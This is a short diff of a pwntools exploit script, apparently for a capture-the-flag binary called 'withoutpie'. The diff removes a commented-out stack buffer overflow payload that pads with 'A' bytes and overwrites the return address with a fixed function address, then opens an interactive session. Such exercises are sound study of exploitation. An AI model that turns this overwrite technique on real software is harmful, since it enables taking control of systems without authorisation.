@@ -4,17 +4,6 @@ from pwn import *
 
 """ p = process("./withoutpie") """
 
-""" p.sendline(payload)
-
-p.interactive()
-
-payload = b"A" * (0x71+0x4) + p32(0x08049182)
-
-p = process("./withoutpie")
-
-p.sendline(payload)
-
-p.interactive() """
 
 binary = context.binary = ELF('./withoutpie')
 p= process(binary.path)
